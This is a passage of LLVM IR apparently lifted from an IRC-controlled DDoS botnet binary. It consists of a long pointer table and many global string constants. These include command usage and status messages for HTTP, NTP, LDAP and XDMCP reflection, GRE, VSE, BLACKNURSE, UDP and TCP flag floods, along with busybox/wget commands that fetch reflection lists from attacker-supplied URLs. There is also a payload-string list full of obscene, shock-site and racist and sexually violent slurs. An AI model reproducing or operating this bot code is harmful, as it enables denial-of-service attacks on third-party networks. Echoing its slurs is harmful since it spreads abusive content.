i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029da4.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029da4.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029da4.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029da4.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029da4.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029da4.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029da4.188, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029dac.189, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029db8.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029da4.188, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029dc0.191, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10029dc8.192, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029da4.188, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029dd0.193, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10029dd8.194, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029de8.195, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029dac.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029df0.196, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029df8.197, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029e00.198, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029db8.190, i32 0, i32 0), i8* bitcast (i32* @global_var_10029e0c.199 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029da4.188, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029e10.200, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029e18.201, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029e20.202, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029db8.190, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029e28.203, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029e30.204, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10029e3c.205, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10029e4c.206, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10029e58.207, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029e5c.208, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029e64.209, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10029e6c.210, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029e78.211, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029e84.212, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029e8c.213, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029e94.214, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029e9c.215, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029ea8.216, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029eb0.217, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029eb8.218, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029ec0.219, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10029ec8.220, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029dac.189, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10029ed4.221, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029ee0.222, i32 0, i32 0), i8* bitcast (i32* @global_var_10029e0c.199 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029ee8.223, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029e00.198, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029ef0.224, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029efc.225, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10029f08.226, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029f10.227, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029f18.228, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10029e58.207, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029f20.229, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10029e3c.205, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029f28.230, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029e30.204, i32 0, i32 0), i8* bitcast (i32* @global_var_10029e0c.199 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029e84.212, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029f30.231, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029e28.203, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10029f38.232, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10029f44.233, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10029f50.234, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029df0.196, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10029ec8.220, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029ee0.222, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029f54.235, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029ee8.223, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029eb0.217, i32 0, i32 0), i8* bitcast (i32* @global_var_10029e0c.199 to i8*), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029da4.188, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10029f08.226, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029ee8.223, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029d9c.187, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029ee0.222, i32 0, i32 0), i8* bitcast (i32* @global_var_10029e0c.199 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029db8.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029da4.188, i32 0, i32 0), i8* bitcast (i32* @global_var_10029e0c.199 to i8*), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10029ec8.220, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029df0.196, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029ec0.219, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10029f44.233, i32 0, i32 0), i8* bitcast (i32* @global_var_10029e0c.199 to i8*), i8* bitcast (i32* @global_var_10029e0c.199 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029eb0.217, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029dd0.193, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029e9c.215, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029f30.231, i32 0, i32 0), i8* bitcast (i32* @global_var_10029e0c.199 to i8*), i8* bitcast (i32* @global_var_10029e0c.199 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029e94.214, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029f5c.236, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029f28.230, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10029e3c.205, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029f20.229, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10029e58.207, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029f18.228, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029f10.227, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029dac.189, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10029f08.226, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029efc.225, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029ef0.224, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029e30.204, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029e28.203, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029db8.190, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029e20.202, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10029ec8.220, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029df8.197, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029f64.237, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029e18.201, i32 0, i32 0), i8* bitcast (i32* @global_var_10029e0c.199 to i8*), i8* bitcast (i32* @global_var_10029e0c.199 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029e10.200, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029ee0.222, i32 0, i32 0), i8* bitcast (i32* @global_var_10029f6c.238 to i8*), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10029f70.239, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029f74.240, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029f7c.241, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029f84.242, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029f8c.243, i32 0, i32 0)]
@global_var_1002a944.245 = constant [29 x i8] c"NOTICE %s :HTTP Flooding %s\0A\00"
@global_var_10004600.246 = constant i32 1207959760
@global_var_1002a964.247 = constant [181 x i8] c"wget -U \22%s\22 -q \22%s\22 -O /dev/null || busybox wget -U \22%s\22 -q \22%s\22 -O /dev/null || /bin/busybox wget -U \22%s\22 -q \22%s\22 -O /dev/null || /usr/busybox wget -U \22%s\22 -q \22%s\22 -O /dev/null &\00"
@global_var_100046d0.248 = constant [3 x i8] c"8`\00"
@global_var_10004834.251 = constant [3 x i8] c"8`\00"
@global_var_1000495c.252 = constant [3 x i8] c"8`\00"
@global_var_10004970.253 = constant [3 x i8] c"9 \00"
@global_var_1002aa28.254 = constant [112 x i8] c"NOTICE %s :NTP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_10004b04.255 = constant [3 x i8] c"8`\00"
@global_var_1002aa98.256 = constant [171 x i8] c"wget \22%s\22 -q -O NTP.txt || busybox wget \22%s\22 -O NTP.txt || /bin/busybox wget \22%s\22 -O NTP.txt || /usr/busybox wget \22%s\22 -O NTP.txt || /var/run/busybox wget \22%s\22 -O NTP.txt\00"
@global_var_10004bb4.257 = constant [3 x i8] c"8`\00"
@global_var_10004bc8.258 = constant i32 939524096
@global_var_1002ab44.259 = constant [8 x i8] c"NTP.txt\00"
@global_var_1002ab4c.260 = constant [36 x i8] c"NOTICE %s :NTP amp attacking %s:%s\0A\00"
@global_var_10004f90.261 = constant i32 939524096
@global_var_1002ab70.262 = constant i32 50531635
@global_var_1000511c.263 = constant i32 939524132
@global_var_1002ab94.264 = constant [41 x i8] c"NOTICE %s :BLACKNURSE <target ip> <secs>\00"
@global_var_10005198.265 = constant [3 x i8] c"8`\00"
@global_var_10005250.266 = constant [3 x i8] c"8`\00"
@global_var_1002abc0.267 = constant [7 x i8] c"socket\00"
@global_var_10005284.268 = constant [3 x i8] c"8`\00"
@global_var_1002abc8.269 = constant [28 x i8] c"NOTICE %s :Blacknursing %s\0A\00"
@global_var_1002abe4.270 = constant [7 x i8] c"sendto\00"
@global_var_1000538c.271 = constant i32 1207959632
@global_var_100053c4.272 = constant i32 939524096
@global_var_100451a8.273 = local_unnamed_addr global i32 0
@global_var_1004ed78.274 = global i32 0
@global_var_1002abec.275 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_100054f0.276 = constant [3 x i8] c"8`\00"
@global_var_1004dc50.277 = global i32 0
@global_var_1000555c.278 = constant [3 x i8] c"8`\00"
@global_var_1004ed64.279 = global i32 0
@global_var_100055c8.280 = constant [3 x i8] c"8`\00"
@global_var_1004ed8c.281 = global i32 0
@global_var_10005634.282 = constant [3 x i8] c"8`\00"
@global_var_100059ac.283 = constant [3 x i8] c"8`\00"
@global_var_100059c0.284 = constant [3 x i8] c"9 \00"
@global_var_1002abf8.285 = constant [102 x i8] c"NOTICE %s :GRE <target IP> <port dest> <number threads to use> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_1002ac60.286 = constant [29 x i8] c"NOTICE %s :GRE ATTACKING %s\0A\00"
@global_var_10005de0.287 = constant i32 939524096
@global_var_10005f14.288 = constant i32 939524096
@global_var_100062ac.295 = constant [3 x i8] c"8`\00"
@global_var_100062c0.296 = constant [3 x i8] c"9 \00"
@global_var_1002ac98.297 = constant [90 x i8] c"NOTICE %s :VSE <target IP> <number threads to use> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_1002acf4.298 = constant [29 x i8] c"NOTICE %s :VSE ATTACKING %s\0A\00"
@global_var_100065d8.299 = constant i32 939524096
@global_var_1000670c.300 = constant i32 939524096
@global_var_10006958.304 = constant [3 x i8] c"8`\00"
@global_var_10006a80.305 = constant [3 x i8] c"8`\00"
@global_var_10006a94.306 = constant [3 x i8] c"9 \00"
@global_var_1002ad1c.307 = constant [114 x i8] c"NOTICE %s :XMDCP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_10006c28.308 = constant [3 x i8] c"8`\00"
@global_var_10006c30.309 = constant [3 x i8] c"8`\00"
@global_var_1002ad90.310 = constant [166 x i8] c"wget \22%s\22 -q -O XM.txt || busybox wget \22%s\22 -O XM.txt || /bin/busybox wget \22%s\22 -O XM.txt || /usr/busybox wget \22%s\22 -O XM.txt || /var/run/busybox wget \22%s\22 -O XM.txt\00"
@global_var_10006cf8.311 = constant [3 x i8] c"8`\00"
@global_var_10006d0c.312 = constant i32 939524096
@global_var_1002ae38.313 = constant [7 x i8] c"XM.txt\00"
@global_var_1002ae40.314 = constant [32 x i8] c"NOTICE %s :XDMCP ATTACKING: %s\0A\00"
@global_var_1000712c.315 = constant i32 939524096
@global_var_10007260.316 = constant i32 939524096
@global_var_1002ae60.317 = constant i32 813957120
@global_var_100073f8.318 = constant [3 x i8] c"8`\00"
@global_var_100074b4.319 = constant [3 x i8] c"8`\00"
@global_var_100075dc.320 = constant [3 x i8] c"8`\00"
@global_var_100075f0.321 = constant [3 x i8] c"9 \00"
@global_var_1002ae94.322 = constant [113 x i8] c"NOTICE %s :LDAP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_10007784.323 = constant [3 x i8] c"8`\00"
@global_var_1000778c.324 = constant [3 x i8] c"8`\00"
@global_var_1002af08.325 = constant [176 x i8] c"wget \22%s\22 -q -O LDAP.txt || busybox wget \22%s\22 -O LDAP.txt || /bin/busybox wget \22%s\22 -O LDAP.txt || /usr/busybox wget \22%s\22 -O LDAP.txt || /var/run/busybox wget \22%s\22 -O LDAP.txt\00"
@global_var_10007854.326 = constant [3 x i8] c"8`\00"
@global_var_10007868.327 = constant i32 939524096
@global_var_1002afb8.328 = constant [9 x i8] c"LDAP.txt\00"
@global_var_1002afc4.329 = constant [31 x i8] c"NOTICE %s :LDAP ATTACKING: %s\0A\00"
@global_var_10007c88.330 = constant i32 939524096
@global_var_10007dbc.331 = constant i32 939524096
@global_var_1002afe4.332 = constant [39 x i8] c"NOTICE %s :UDP <target> <port> <secs>\0A\00"
@global_var_10007eac.333 = constant [3 x i8] c"8`\00"
@global_var_1002b00c.334 = constant [25 x i8] c"NOTICE %s :Packeting %s\0A\00"
@global_var_1000811c.335 = constant i32 939524096
@global_var_1002b028.336 = constant i32 2
@global_var_10008194.337 = constant i32 939524096
@global_var_1002b078.338 = constant [39 x i8] c"NOTICE %s :PAN <target> <port> <secs>\0A\00"
@global_var_10008218.339 = constant [3 x i8] c"8`\00"
@global_var_10008220.340 = constant i32 939524096
@global_var_1002b0a0.341 = constant [23 x i8] c"NOTICE %s :Panning %s\0A\00"
@global_var_10008560.342 = constant [3 x i8] c"9?\00"
@global_var_10008604.343 = constant i32 939524096
@global_var_1002b134.344 = constant i32 2
@global_var_1000867c.345 = constant i32 939524096
@global_var_1002b0b8.346 = constant i32 21
@global_var_100086ac.347 = constant i32 939524127
@global_var_1002b184.348 = constant [45 x i8] c"NOTICE %s :GIGATCP <target> <method> <secs>\0A\00"
@global_var_10008728.349 = constant [3 x i8] c"8`\00"
@global_var_10008730.350 = constant i32 939524096
@global_var_1002b1b4.351 = constant [65 x i8] c"NOTICE %s :GIGA-TCP Flooding %s using the ' %s ' method Request\0A\00"
@global_var_100087f4.352 = constant i32 939524098
@global_var_1002b1f8.353 = constant [4 x i8] c"all\00"
@global_var_1002b1fc.354 = constant [5 x i8] c"xmas\00"
@global_var_1002b204.355 = constant [5 x i8] c"usyn\00"
@global_var_1002b20c.356 = constant [7 x i8] c"GigAck\00"
@global_var_1002b214.357 = constant [8 x i8] c"GigaSyn\00"
@global_var_1002b21c.358 = constant i32 738197504
@global_var_1002b220.359 = constant [4 x i8] c"syn\00"
@global_var_1002b224.360 = constant [4 x i8] c"rst\00"
@global_var_1002b228.361 = constant [4 x i8] c"fin\00"
@global_var_1002b22c.362 = constant [4 x i8] c"ack\00"
@global_var_1002b230.363 = constant [4 x i8] c"psh\00"
@global_var_1002b234.364 = constant [4 x i8] c"urg\00"
@global_var_10008d5c.365 = constant [3 x i8] c"9?\00"
@global_var_10008e00.366 = constant i32 939524096
@global_var_10008e64.367 = constant i32 939524096
@global_var_1002b238.368 = constant [85 x i8] c"NOTICE %s :UNKNOWN <target> <port, 0 for random> <packet size, 0 for random> <secs>\0A\00"
@global_var_10008f74.369 = constant [3 x i8] c"8`\00"
@global_var_1002b290.370 = constant i32 805306368
@global_var_1002b294.371 = constant [7 x i8] c"random\00"
@global_var_1002b29c.372 = constant [49 x i8] c"NOTICE %s :Unknowning %s:%s with packet size %s\0A\00"
@global_var_1000917c.373 = constant i32 1207959592
@global_var_100091a4.374 = constant [3 x i8] c"8`\00"
@global_var_10009250.375 = constant [3 x i8] c"8`\00"
@global_var_1002b2d0.377 = constant [4 x i8] c"std\00"
@global_var_1002b2d4.378 = constant [4 x i8] c"dts\00"
@global_var_1002b2d8.379 = constant [4 x i8] c"lsk\00"
@global_var_1002b2dc.380 = constant [4 x i8] c"kek\00"
@global_var_1002b2e0.381 = constant [6 x i8] c"smack\00"
@global_var_1002b2e8.382 = constant [4 x i8] c"ily\00"
@global_var_1002b2ec.383 = constant [10 x i8] c"tfw no gf\00"
@global_var_1002b2f8.384 = constant [11 x i8] c"frienzoned\00"
@global_var_1002b304.385 = constant [4 x i8] c"tyf\00"
@global_var_1002b308.386 = constant [4 x i8] c"pos\00"
@global_var_1002b30c.387 = constant [6 x i8] c"cunts\00"
@global_var_1002b314.388 = constant [9 x i8] c"NullzSec\00"
@global_var_1002b320.389 = constant [13 x i8] c"NullzSec rox\00"
@global_var_1002b330.390 = constant [21 x i8] c"Sh4dow on your 4head\00"
@global_var_1002b348.391 = constant [10 x i8] c"get raped\00"
@global_var_1002b354.392 = constant [18 x i8] c"not a ddos packet\00"
@global_var_1002b368.393 = constant [23 x i8] c"also not a ddos packet\00"
@global_var_1002b380.394 = constant [28 x i8] c"seriously not a ddos packet\00"
@global_var_1002b39c.395 = constant [38 x i8] c"GET / HTTP/1.1\0D\0AHost: goatse.info\0D\0A\0D\0A\00"
@global_var_1002b3c4.396 = constant [37 x i8] c"GET / HTTP/1.1\0D\0AHost: tubgirl.ca\0D\0A\0D\0A\00"
@global_var_1002b3ec.397 = constant [38 x i8] c"GET / HTTP/1.0\0D\0AHost: goatse.info\0D\0A\0D\0A\00"
@global_var_1002b414.398 = constant [37 x i8] c"GET / HTTP/1.0\0D\0AHost: tubgirl.ca\0D\0A\0D\0A\00"
@global_var_1002b43c.399 = constant [16 x i8] c"8======D~~~~~~~\00"
@global_var_1002b44c.400 = constant [8 x i8] c"suck it\00"
@global_var_1002b454.401 = constant [10 x i8] c"give succ\00"
@global_var_1002b460.402 = constant [47 x i8] c"big nigger dick 8============================D\00"
@global_var_1002b490.403 = constant [18 x i8] c"( . Y . ) tiddies\00"
@global_var_1002b4a4.404 = constant [9 x i8] c"bigNullz\00"
@global_var_1002b4b0.405 = constant [13 x i8] c"eye pee rape\00"
@global_var_1002b4c0.406 = constant [21 x i8] c"eye pee address rape\00"
@global_var_1002b4d8.407 = constant [8 x i8] c"IP rape\00"
@global_var_1002b4e0.408 = constant [13 x i8] c"This is LOIC\00"
@global_var_1002b4f0.409 = constant [5 x i8] c"LOIC\00"
@global_var_1002b4f8.410 = constant [5 x i8] c"HOIC\00"
@global_var_1002b500.411 = constant [5 x i8] c"XOIC\00"
@global_var_1002b508.412 = constant [7 x i8] c"LHXOIC\00"
@global_var_1002b510.413 = constant [33 x i8] c"A cat is fine too. Desudesudesu~\00"
@global_var_1002b534.414 = constant [18 x i8] c"the biiiiig pussy\00"
@global_var_1002b548.415 = constant [6 x i8] c"benis\00"
@global_var_1002b550.416 = constant [6 x i8] c"penis\00"
@global_var_1002b558.417 = constant [5 x i8] c"dick\00"
@global_var_1002b560.418 = constant [7 x i8] c"vagina\00"
@global_var_1002b568.419 = constant [9 x i8] c"clitoris\00"
@global_var_1002b574.420 = constant [6 x i8] c"pussy\00"
@global_var_1002b57c.421 = constant [4 x i8] c"tfw\00"
@global_var_1002b580.422 = constant [4 x i8] c":^}\00"
@global_var_1002b584.423 = constant [9 x i8] c"dic pic?\00"
@global_var_1002b590.424 = constant [11 x i8] c"send nudes\00"
@global_var_1002b59c.425 = constant [29 x i8] c"https://youtu.be/dQw4w9WgXcQ\00"
@global_var_1002b5bc.426 = constant [24 x i8] c"Never gonna give you up\00"
@global_var_1002b5d4.427 = constant [25 x i8] c"Never gonna make you cry\00"
